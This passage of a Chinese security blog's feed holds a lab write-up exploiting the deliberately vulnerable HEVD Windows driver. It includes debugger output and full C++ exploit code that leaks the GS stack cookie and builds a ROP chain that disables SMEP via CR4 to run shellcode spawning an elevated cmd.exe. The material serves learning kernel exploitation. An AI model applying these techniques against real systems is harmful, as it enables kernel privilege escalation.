class="built_in">PIMAGE_IMPORT_BY_NAME</span>(&amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + <span class="keyword">this</span>-&gt;<span class="built_in">dwVAToRaw</span>(VA));</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;    Function &quot;</span> &lt;&lt; IatName-&gt;Name &lt;&lt; endl;</span><br><span class="line">VA = *<span class="built_in">PDWORD64</span>(&amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + <span class="keyword">this</span>-&gt;<span class="built_in">dwVAToRaw</span>(pIAT-&gt;OriginalFirstThunk) + i * <span class="built_in">sizeof</span>(DWORD64));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/medium/2c0ece8077ee8d172ae716ebdc5d5b77.png" alt="image-20240225223834556" /></p><h1 id="找到入口函数"><a class="markdownIt-Anchor" href="#找到入口函数"></a> 找到入口函数</h1><p>很简单，在上面的<code>nt-&gt;option_header.AddressOfEntryPoint</code>里面，可以直接ImageBase+AddressOfEntryPoint，二进制数据都对的上</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近代码能力飞速提升，顺便复习一下&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="C" scheme="https://joe1sn.eu.org/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】HEVD-内核栈溢出GS保护及绕过</title>
    <link href="https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/"/>
    <id>https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/</id>
    <published>2024-02-24T03:10:43.000Z</published>
    <updated>2025-01-26T14:46:00.752Z</updated>
    
    <content type="html"><![CDATA[<p>HEVD中的栈溢出加上GS保护<br />还有一个知识点就是windows内核栈地址泄露</p><span id="more"></span><p>函数功能</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a1743db93e122898948550a845f7d04f.png" alt="image-20240124203451123" /></p><p>在上三篇中讲的很清楚了，这里我关闭了KVAS</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/21407e450615457821bd83e162b53ecc.png" alt="image-20240124203542280" /></p><p>又是一段经典的栈溢出，但是有了内核的GS保护</p><h1 id="编写exploit"><a class="markdownIt-Anchor" href="#编写exploit"></a> 编写exploit</h1><p>这里就不得不提到Windows中一种Cannary的绕过方式了，通过try except的Handler进行绕过，很遗憾handler只在32位程序中才保存在栈上</p><p>查阅资料</p><p><a href="https://paper.seebug.org/2017/#22">https://paper.seebug.org/2017/#22</a></p><p><a href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html</a></p><p>cookie值是存储在<code>_data</code>段的第一个</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1c6b200d43a1bc05250cfd066d6c2991.png" alt="image-20240124215049718" /></p><p>函数检查的部分，有一个异或</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/fb17ff5c2760ddac222db2dda25f7b7f.png" alt="image-20240124215249257" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dqs rsp</span><br><span class="line">ffff8788`21979540  00000000`00000000</span><br><span class="line">ffff8788`21979548  ffffc186`261f98f0</span><br><span class="line">ffff8788`21979550  ffffc186`269c86b0</span><br><span class="line">ffff8788`21979558  00000000`80000004</span><br><span class="line">ffff8788`21979560  00000000`00000000</span><br><span class="line">ffff8788`21979568  fffff804`2a4d66e5 HEVD!TriggerBufferOverflowStackGS+0x5 [c:\projects\hevd\driver\hevd\bufferoverflowstackgs.c @ 70]</span><br><span class="line">ffff8788`21979570  00000000`00000000</span><br><span class="line">ffff8788`21979578  00000000`00000003</span><br><span class="line">ffff8788`21979580  54535f57`4f4c4652</span><br><span class="line">ffff8788`21979588  ffffc186`1f93206c</span><br><span class="line">ffff8788`21979590  00000000`00000000</span><br><span class="line">ffff8788`21979598  00000000`00000000</span><br><span class="line">ffff8788`219795a0  00000000`00000000</span><br><span class="line">ffff8788`219795a8  00000000`00000000</span><br><span class="line">ffff8788`219795b0  ffff8788`219796a0</span><br><span class="line">ffff8788`219795b8  00000000`00000000</span><br><span class="line"></span><br><span class="line">1: kd&gt; r rax</span><br><span class="line">rax=0000ad1068899811</span><br><span class="line"></span><br><span class="line">1: kd&gt; s rsp L1000 07 20 22</span><br><span class="line">ffff8788`219797e8  07 20 22 00 00 00 00 00-20 0d 07 27 86 c1 ff ff  . &quot;..... ..&#x27;....</span><br><span class="line">ffff8788`21979988  07 20 22 00 86 c1 ff ff-00 00 00 00 00 00 00 00  . &quot;.............</span><br><span class="line">ffff8788`21979a48  07 20 22 00 ff ff ff ff-30 e8 d9 1f 07 00 00 00  . &quot;.....0.......</span><br><span class="line">ffff8788`21979ab8  07 20 22 00 00 00 00 00-30 e8 d9 1f 07 00 00 00  . &quot;.....0.......</span><br><span class="line">1: kd&gt; ? ffff8788`219797e8-rsp</span><br><span class="line">Evaluate expression: 680 = 00000000`000002a8</span><br></pre></td></tr></table></figure><ol><li><p>利用之前的<code>ulGetBase</code>得到<code>HEVD.sys</code>的基地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dqs  0xfffff80522fe0000+3000</span><br><span class="line">fffff805`22fe3000  00006fd9`604347b3</span><br><span class="line">fffff805`22fe3008  ffff9026`9fbcb84c</span><br></pre></td></tr></table></figure><p>再下断点看看是不是为这个值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">HEVD!TriggerBufferOverflowStackGS+0x1b:</span><br><span class="line">fffff805`230666fb 4833c4          xor     rax,rsp</span><br><span class="line">1: kd&gt; r rax</span><br><span class="line">rax=00006fd9604347b3</span><br></pre></td></tr></table></figure><p>还真是，那么访问<code>base+3000</code>就可以得<code>cookie</code>值</p></li><li><p>如何读取？这个还真没办法，只能利用另外一个漏洞<code>HEVD_IOCTL_ARBITRARY_WRITE</code>，将该值修改为我们自己的值，也可以设置<code>Ring3ToKernel</code>中的一个地址的值为待写入的地方，然后利用这个漏洞将<code>cookie</code>写入</p></li><li><p><code>key</code>值位于<code>rsp</code>上，利用<code>NtQuerySystemInformation</code>中的<code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code>可以得到，</p><p>但是后面又看不了了，这个时候我想了下，一个exp可以看到另外一个exp的栈地址，但是查看自身的时候已经不在上面了，或许改为线程执行可以？</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/afed146baf184820b89d608a1d389bea.png" alt="image-20240224093858858" /></p><p>就用这种方法试试看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] Found Ring3ToKernel.exe</span><br><span class="line">Stack base 0xffffef8360dce000   Stack limit 0xffffef8360dc8000</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2bbb268241ad0b8cb84e109543a4d1c3.png" alt="image-20240224101543720" /></p><p>偏移是一个定值，再回忆一下之前的cookie生成算法就能得cookie了<br />但是有个小问题，合成cookie时，rsp值变化了</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a8a2278b4ba72209556e3640b3b8b4ff.png" alt="image-20240224103819644" /><br />考虑到push和sub所以：rsp = stack base - 0x868 - 0x258</p><p>此实，key值为：0000768c469d2a88，rsp = ffffef83619aa798，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x0000768c469d2a88^(0xffffef83619aa798-0x258))</span><br><span class="line">&#x27;0xffff990f27078fc8&#x27;</span><br></pre></td></tr></table></figure><p>得到cookie值为<code>0xffff990f27078fc8</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/708fcb6fd0aa1439e655314f5cb7e5ad.png" alt="image-20240224103938531" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie Address 0x%llx\n&quot;</span>,cookie_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Atribute Write GET key value\n&quot;</span>);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WRITE_WHAT_WHERE</span></span><br><span class="line">&#123;</span><br><span class="line">funcaddr* What;</span><br><span class="line">funcaddr* Where;</span><br><span class="line">&#125;arbitrary_write, * pArbitraryWrite;</span><br><span class="line">funcaddr value = <span class="number">0</span>;</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(arbitrary_write));</span><br><span class="line">payload-&gt;What = (funcaddr*)cookie_addr;</span><br><span class="line">payload-&gt;Where = &amp;value;</span><br><span class="line">DWORD size = <span class="built_in">sizeof</span>(payload);</span><br><span class="line">DWORD info = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, <span class="number">0x22200B</span>,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Key value 0x%llx\n&quot;</span>, value);</span><br></pre></td></tr></table></figure></li><li><p>然后就是经典常规栈溢出+ROP打法</p></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflowGS</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD oldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line"><span class="built_in">sizeof</span>(cmd),</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="built_in">sizeof</span>(cmd));</span><br><span class="line"></span><br><span class="line"><span class="built_in">ulGetStackLimit</span>(<span class="string">L&quot;Ring3ToKernel.exe&quot;</span>);</span><br><span class="line">funcaddr base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">funcaddr pop_rcx = base + <span class="number">0x20C64C</span>;</span><br><span class="line">funcaddr mov_cr4_rcx = base + <span class="number">0x39eb47</span>;</span><br><span class="line">funcaddr hevd_base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;HEVD.sys&quot;</span>);</span><br><span class="line">funcaddr cookie_addr = hevd_base + <span class="number">0x3000</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie Address 0x%llx\n&quot;</span>,cookie_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Atribute Write GET key value\n&quot;</span>);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WRITE_WHAT_WHERE</span></span><br><span class="line">&#123;</span><br><span class="line">funcaddr* What;</span><br><span class="line">funcaddr* Where;</span><br><span class="line">&#125;arbitrary_write, * pArbitraryWrite;</span><br><span class="line">funcaddr value = <span class="number">0</span>;</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(arbitrary_write));</span><br><span class="line">payload-&gt;What = (funcaddr*)cookie_addr;</span><br><span class="line">payload-&gt;Where = &amp;value;</span><br><span class="line">DWORD size = <span class="built_in">sizeof</span>(payload);</span><br><span class="line">DWORD info = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, <span class="number">0x22200B</span>,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Key value 0x%llx\n&quot;</span>, value);</span><br><span class="line"></span><br><span class="line">funcaddr rsp = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf_s</span>(<span class="string">&quot;%llx&quot;</span>, &amp;rsp);</span><br><span class="line">rsp -= (<span class="number">0x868</span> + <span class="number">0x258</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] RSP value 0x%llx\n&quot;</span>, rsp);</span><br><span class="line"></span><br><span class="line">rsp ^= value;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie value 0x%llx\n&quot;</span>, rsp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line"><span class="comment">//RtlFillMemory(stackspace, 0x238, &#x27;A&#x27;);</span></span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x200</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">size = <span class="number">0x258</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x200</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x208</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x210</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x218</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x220</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x228</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x230</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x238</span>) = (funcaddr)pop_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x240</span>) = (funcaddr)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x248</span>) = (funcaddr)mov_cr4_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x250</span>) = (funcaddr)shellcode_addr;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/04085ad653545f1461b7b9f567e10b46.png" alt="image-20240224121139780" /></p><h1 id="微调exploit"><a class="markdownIt-Anchor" href="#微调exploit"></a> 微调exploit</h1><ul><li><p>shellcode得仔细调整rsp值</p><p>很简单，和最开的是栈溢出一样，直接一个push两个ret，让rsp+0x28变成了rsp+0x10</p></li><li><p>还有就是泄露内核栈地址的时候得稳定，让其包含当前进程</p><p>我的解决方法简单粗暴，多线程和直接加<code> system(&quot;pause&quot;);</code>，重新弄好的方案都能打包成一个函数了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulUseStackInfo</span><span class="params">(<span class="type">wchar_t</span> ProcName[])</span> </span>&#123;</span><br><span class="line">pStackInfo stackinfo = (pStackInfo)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(StackInfo));</span><br><span class="line"><span class="keyword">if</span> (stackinfo == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Can&#x27;t allocate memory\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">stackinfo-&gt;ModuleName = ProcName;</span><br><span class="line">stackinfo-&gt;result = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0x100</span>, (LPTHREAD_START_ROUTINE)ulGetStackLimit, stackinfo, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Can&#x27;t get thread\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">funcaddr baseaddr = stackinfo-&gt;result;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">free</span>(stackinfo);</span><br><span class="line"><span class="keyword">return</span> baseaddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>最终exp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflowGS</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD oldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line"><span class="built_in">sizeof</span>(cmd),</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="built_in">sizeof</span>(cmd));</span><br><span class="line"></span><br><span class="line">funcaddr stack_base = <span class="built_in">ulUseStackInfo</span>(<span class="string">L&quot;Ring3ToKernel.exe&quot;</span>);</span><br><span class="line">funcaddr base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">funcaddr pop_rcx = base + <span class="number">0x20C64C</span>;</span><br><span class="line">funcaddr mov_cr4_rcx = base + <span class="number">0x39eb47</span>;</span><br><span class="line">funcaddr hevd_base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;HEVD.sys&quot;</span>);</span><br><span class="line">funcaddr cookie_addr = hevd_base + <span class="number">0x3000</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie Address 0x%llx\n&quot;</span>,cookie_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Atribute Write GET key value\n&quot;</span>);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WRITE_WHAT_WHERE</span></span><br><span class="line">&#123;</span><br><span class="line">funcaddr* What;</span><br><span class="line">funcaddr* Where;</span><br><span class="line">&#125;arbitrary_write, * pArbitraryWrite;</span><br><span class="line">funcaddr value = <span class="number">0</span>;</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(arbitrary_write));</span><br><span class="line">payload-&gt;What = (funcaddr*)cookie_addr;</span><br><span class="line">payload-&gt;Where = &amp;value;</span><br><span class="line">DWORD size = <span class="built_in">sizeof</span>(payload);</span><br><span class="line">DWORD info = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, <span class="number">0x22200B</span>,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Key value 0x%llx\n&quot;</span>, value);</span><br><span class="line"></span><br><span class="line">funcaddr cookie = <span class="number">0</span>;</span><br><span class="line">stack_base -= (<span class="number">0x868</span> + <span class="number">0x258</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] RSP value 0x%llx\n&quot;</span>, stack_base);</span><br><span class="line"></span><br><span class="line">cookie = stack_base ^ value;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie value 0x%llx\n&quot;</span>, cookie);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x200</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">size = <span class="number">0x258</span>;</span><br><span class="line"><span class="comment">//size = 0x200;</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x200</span>) = (funcaddr)cookie;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x208</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x210</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x218</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x220</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x228</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x230</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x238</span>) = (funcaddr)pop_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x240</span>) = (funcaddr)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x248</span>) = (funcaddr)mov_cr4_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x250</span>) = (funcaddr)shellcode_addr;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/fd9a8491ecc46c58eb2957ca7579ab55.png" alt="image-20240224140007704" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HEVD中的栈溢出加上GS保护&lt;br /&gt;
还有一个知识点就是windows内核栈地址泄露&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】HEVD-任意地址写</title>
    <link href="https://joe1sn.eu.org/2024/02/23/win-hevd-exp-arbitrary-write/"/>
    <id>https://joe1sn.eu.org/2024/02/23/win-hevd-exp-arbitrary-write/</id>
    <published>2024-02-23T15:35:34.000Z</published>
    <updated>2025-01-26T14:46:00.752Z</updated>
    
